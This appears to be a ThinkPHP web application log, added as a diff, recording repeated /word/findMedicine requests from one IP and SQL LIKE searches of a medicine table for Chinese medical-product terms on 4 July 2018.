+INFO: [ app_begin ] --END-- [ RunTime:0.000085s ]
+
+[ 2018-07-04T11:08:13+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000099s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000030s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000076s ]
+
+[ 2018-07-04T11:08:13+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000125s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000078s ]
+
+[ 2018-07-04T11:08:13+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000117s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:08:13+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:08:13+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000118s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000036s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000087s ]
+
+[ 2018-07-04T11:08:15+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000110s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+SQL: select * from md_medicine where medicine_name like '%树脂%' and isdel=1 [ RunTime:0.0096s ]
+
+[ 2018-07-04T11:08:29+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000116s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000036s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000083s ]
+
+[ 2018-07-04T11:09:24+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000033s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000147s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000037s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000089s ]
+
+[ 2018-07-04T11:09:25+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000111s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000084s ]
+
+[ 2018-07-04T11:09:25+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000103s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+
+[ 2018-07-04T11:09:25+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000110s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:09:25+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000027s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000128s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000040s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000088s ]
+
+[ 2018-07-04T11:09:25+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000113s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000036s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000084s ]
+
+[ 2018-07-04T11:09:25+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000028s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000133s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:09:26+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000119s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+SQL: select * from md_medicine where medicine_name like '%手机%' and isdel=1 [ RunTime:0.0096s ]
+
+[ 2018-07-04T11:09:32+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000127s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000087s ]
+SQL: select * from md_medicine where medicine_name like '%关节镜刨削手机及附件%' and isdel=1 [ RunTime:0.0096s ]
+
+[ 2018-07-04T11:09:36+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000150s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000040s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000088s ]
+
+[ 2018-07-04T11:09:37+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000120s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+
+[ 2018-07-04T11:09:37+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000030s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000074s ]
+
+[ 2018-07-04T11:09:37+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000110s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000044s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000095s ]
+
+[ 2018-07-04T11:09:38+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000113s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000079s ]
+
+[ 2018-07-04T11:09:38+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000123s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000031s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000084s ]
+
+[ 2018-07-04T11:09:39+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000114s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000037s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000084s ]
+SQL: select * from md_medicine where medicine_name like '%高速%' and isdel=1 [ RunTime:0.0098s ]
+
+[ 2018-07-04T11:09:39+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000092s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000029s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000071s ]
+SQL: select * from md_medicine where medicine_name like '%高速%' and isdel=1 [ RunTime:0.0089s ]
+
+[ 2018-07-04T11:10:07+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000116s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000047s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000095s ]
+
+[ 2018-07-04T11:10:10+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000118s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000037s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000083s ]
+
+[ 2018-07-04T11:10:10+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000107s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000031s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000075s ]
+
+[ 2018-07-04T11:10:11+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000116s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000030s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+
+[ 2018-07-04T11:10:11+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000111s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000042s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000089s ]
+
+[ 2018-07-04T11:10:11+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000107s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:10:11+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000116s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000084s ]
+
+[ 2018-07-04T11:10:11+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000036s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000125s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:10:11+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000107s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000079s ]
+
+[ 2018-07-04T11:10:11+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000027s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000123s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000078s ]
+SQL: select * from md_medicine where medicine_name like '%超声%' and isdel=1 [ RunTime:0.0097s ]
+
+[ 2018-07-04T11:10:11+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000103s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000079s ]
+SQL: select * from md_medicine where medicine_name like '%超声%' and isdel=1 [ RunTime:0.0099s ]
+
+[ 2018-07-04T11:10:12+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000119s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000031s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000076s ]
+SQL: select * from md_medicine where medicine_name like '%超声%' and isdel=1 [ RunTime:0.0094s ]
+
+[ 2018-07-04T11:10:39+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000116s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000083s ]
+
+[ 2018-07-04T11:10:39+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000113s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000045s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000092s ]
+
+[ 2018-07-04T11:10:39+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000110s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:10:43+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000115s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000059s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000123s ]
+
+[ 2018-07-04T11:10:43+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000123s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000079s ]
+
+[ 2018-07-04T11:10:43+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000107s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000030s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000075s ]
+
+[ 2018-07-04T11:10:43+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000086s ]
+
+[ 2018-07-04T11:10:44+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000030s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000112s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+
+[ 2018-07-04T11:10:44+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000089s ]
+
+[ 2018-07-04T11:10:44+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000035s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000121s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:10:45+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000118s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000084s ]
+SQL: select * from md_medicine where medicine_name like '%清洁%' and isdel=1 [ RunTime:0.0096s ]
+
+[ 2018-07-04T11:10:45+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000105s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000042s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000088s ]
+SQL: select * from md_medicine where medicine_name like '%清洁%' and isdel=1 [ RunTime:0.0096s ]
+
+[ 2018-07-04T11:10:47+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000117s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000038s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000087s ]
+SQL: select * from md_medicine where medicine_name like '%清洁%' and isdel=1 [ RunTime:0.0096s ]
+
+[ 2018-07-04T11:10:49+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000082s ]
+SQL: select * from md_medicine where medicine_name like '%洁%' and isdel=1 [ RunTime:0.0097s ]
+
+[ 2018-07-04T11:10:59+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000114s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000037s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000092s ]
+SQL: select * from md_medicine where medicine_name like '%洁齿术%' and isdel=1 [ RunTime:0.0095s ]
+
+[ 2018-07-04T11:11:31+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000114s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000044s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000112s ]
+SQL: select * from md_medicine where medicine_name like '%洁%' and isdel=1 [ RunTime:0.0096s ]
+
+[ 2018-07-04T11:11:31+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000102s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+SQL: select * from md_medicine where medicine_name like '%洁%' and isdel=1 [ RunTime:0.0097s ]
+
+[ 2018-07-04T11:11:31+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000102s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000078s ]
+SQL: select * from md_medicine where medicine_name like '%洁%' and isdel=1 [ RunTime:0.0096s ]
+
+[ 2018-07-04T11:11:31+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000036s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000130s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+SQL: select * from md_medicine where medicine_name like '%洁%' and isdel=1 [ RunTime:0.0097s ]
+
+[ 2018-07-04T11:11:32+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000112s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000041s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000088s ]
+SQL: select * from md_medicine where medicine_name like '%洁治疗%' and isdel=1 [ RunTime:0.0095s ]
+
+[ 2018-07-04T11:11:32+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000101s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000082s ]
+SQL: select * from md_medicine where medicine_name like '%洁治疗%' and isdel=1 [ RunTime:0.0096s ]
+
+[ 2018-07-04T11:13:11+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000112s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000036s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000083s ]
+
+[ 2018-07-04T11:13:13+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000126s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000031s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+
+[ 2018-07-04T11:13:14+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000118s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000038s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000092s ]
+
+[ 2018-07-04T11:13:14+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000121s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:13:15+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000104s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000086s ]
+
+[ 2018-07-04T11:13:15+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000106s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000075s ]
+
+[ 2018-07-04T11:13:16+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:13:16+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
